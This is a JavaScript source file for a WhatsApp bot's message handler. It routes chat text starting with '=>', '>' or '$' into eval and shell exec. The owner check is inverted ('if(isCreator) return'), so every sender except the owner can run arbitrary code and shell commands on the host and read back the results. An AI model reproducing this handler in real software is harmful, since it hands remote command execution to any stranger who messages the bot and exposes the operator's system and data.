const fs = require("fs")
const util = require("util")
const chalk = require("chalk")
const { exec } = require("child_process")

module.exports = async (sock, m, store) => {
  try {
    let budy = typeof m.text === "string" ? m.text : "";

let body =
    (m.mtype === 'conversation') ? m.message.conversation :
    (m.mtype === 'imageMessage') ? m.message.imageMessage.caption :
    (m.mtype === 'videoMessage') ? m.message.videoMessage.caption :
    (m.mtype === 'extendedTextMessage') ? m.message.extendedTextMessage.text :
    (m.mtype === 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId :
    (m.mtype === 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId :
    (m.mtype === 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId :
    (m.mtype === 'interactiveResponseMessage') ? JSON.parse(m.msg.nativeFlowResponseMessage.paramsJson).id :
    (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) :
    (m.mtype === 'editedMessage') ? 
        (m.message.editedMessage.message.protocolMessage.editedMessage.conversation || m.message.editedMessage.message.protocolMessage.editedTextMessage.text) : 
    '';

  let prefix = /^[\\/!#.]/gi.test(body) ? body.match(/^[\\/!#.]/gi) : "/";
  const isCmd = body.startsWith(prefix);
  const command = body.replace(prefix, "").trim().split(/ +/).shift().toLowerCase()
  const args = body.trim().split(/ +/).slice(1)
  let text = (q = args.join(" "))
  const isCreator = [sock.decodeJid(sock.user.id), ...global.owner.map(([number]) => number), ].map((v) => v.replace(/[^0-9]/g, "") + "@s.whatsapp.net").includes(m.sender);
  
switch (command) {
break
default:
if (budy.startsWith('=>')) {
if(isCreator) return
    function Return(sul) {
        let sat = JSON.stringify(sul, null, 2);
        let bang = util.format(sat);

        if (sat === undefined) {
            bang = util.format(sul);
        }
        return m.reply(bang);
    }

    try {
        m.reply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)));
    } catch (e) {
        m.reply(String(e));
    }
}

if (budy.startsWith('>')) {
if(isCreator) return
    try {
        let evaled = await eval(budy.slice(2));
        if (typeof evaled !== 'string') evaled = require('util').inspect(evaled);
        await m.reply(evaled);
    } catch (err) {
        await m.reply(String(err));
    }
}

if (budy.startsWith('$')) {
if(isCreator) return
    exec(budy.slice(2), (err, stdout) => {
        if (err) return m.reply(err);
        if (stdout) return m.reply(stdout);
    });
}

}
  
  } catch (error) {
    console.log(error)
    sock.sendMessage(info.owner, {
      text: util.format(error)
    })
  }
}

let file = require.resolve(__filename)
  fs.watchFile(file, () => {
    fs.unwatchFile(file)
    console.log(chalk.cyan("[UPDATE] >> " + chalk.green(`${__filename}`)))
    delete require.cache[file]
    require(file)
  })